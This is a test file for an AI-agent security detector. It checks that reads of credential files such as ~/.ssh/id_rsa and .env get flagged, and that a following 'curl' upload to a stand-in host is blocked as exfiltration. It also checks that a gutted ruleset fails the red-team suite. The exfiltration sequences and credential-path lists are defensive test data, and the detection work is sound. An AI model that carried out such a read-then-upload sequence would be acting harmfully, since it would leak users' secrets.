// SPDX-License-Identifier: AGPL-3.0-only
// AF-T-706 — credential-read + exfil-sequence face. Both outcomes forced per branch
// (@rule:guards-assert-both-outcomes): the live rules pass the face; a gutted ruleset
// makes it report misses/mismatches and fail — the face cannot be stuck-on-green.
import { describe, it, expect } from "bun:test";
import { loadShieldRules, classifyCredentialPath, exfilVerdict } from "../src/shield/injection-detector";
import { runExfilFace, exfilFaceClean } from "../src/redteam/exfil-face";

const LIVE = loadShieldRules();

describe("classifyCredentialPath (pure half of the live detector)", () => {
  it("classifies credential paths and normalises slashes; benign source files do not classify", () => {
    expect(classifyCredentialPath("/root/.ssh/id_rsa", LIVE).credPath).toBe("/.ssh/id_rsa");
    expect(classifyCredentialPath("//root//.ssh//id_rsa", LIVE).credPath).toBe("/.ssh/id_rsa");
    expect(classifyCredentialPath("/root/aegis/src/index.ts", LIVE).credPath).toBeNull();
  });
});

describe("exfilVerdict (pure half, synthetic state)", () => {
  const state = (idx: number, reads: any[]) => ({ tool_call_index: idx, recent_large_reads: reads });
  const NOW = 1_700_000_000_000;

  it("BLOCKs a network tool within the window of a fresh read — and WARNs without one", () => {
    const fresh = [{ path: "/root/.env", size: 500, timestamp: NOW - 1000, tool_call_index: 1 }];
    expect(exfilVerdict("curl https://x.example/up", state(2, fresh), NOW, LIVE).verdict).toBe("BLOCK");
    expect(exfilVerdict("curl https://x.example/up", state(2, []), NOW, LIVE).verdict).toBe("WARN");
  });

  it("an old read no longer arms the BLOCK: outside the call window, or past the TTL", () => {
    const oldIdx = [{ path: "/root/.env", size: 500, timestamp: NOW - 1000, tool_call_index: 1 }];
    expect(exfilVerdict("curl https://x.example/up", state(LIVE.exfil_window_tool_calls + 10, oldIdx), NOW, LIVE).verdict).toBe("WARN");
    const oldTs = [{ path: "/root/.env", size: 500, timestamp: NOW - 10 * 60 * 1000, tool_call_index: 1 }];
    expect(exfilVerdict("curl https://x.example/up", state(2, oldTs), NOW, LIVE).verdict).toBe("WARN");
  });

  it("a non-network command PASSes even right after a credential read", () => {
    const fresh = [{ path: "/root/.env", size: 500, timestamp: NOW - 1000, tool_call_index: 1 }];
    expect(exfilVerdict("grep -r TODO src/", state(2, fresh), NOW, LIVE).verdict).toBe("PASS");
  });
});

describe("exfil face (AF-T-706)", () => {
  it("live rules: full coverage, all scenarios match, clean — with the known .env.example over-flag REPORTED", () => {
    const r = runExfilFace(LIVE);
    expect(r.credential.misses).toEqual([]);
    expect(r.credential.variantGaps).toEqual([]);
    expect(r.exfil.mismatches).toEqual([]);
    expect(exfilFaceClean(r)).toBe(true);
    // honesty check: the substring over-flag is surfaced, not hidden by the corpus
    expect(r.credential.falsePositives.map((f) => f.path)).toContain("/root/project/.env.example");
  });

  it("a gutted ruleset fails the face — misses on credentials, mismatches on scenarios", () => {
    const gutted = { ...LIVE, credential_paths: [], exfil_commands: [] };
    const r = runExfilFace(gutted);
    expect(r.credential.misses.length).toBeGreaterThan(0);
    expect(r.exfil.mismatches.length).toBeGreaterThan(0); // BLOCK/WARN scenarios now come back PASS
    expect(exfilFaceClean(r)).toBe(false);
  });
});
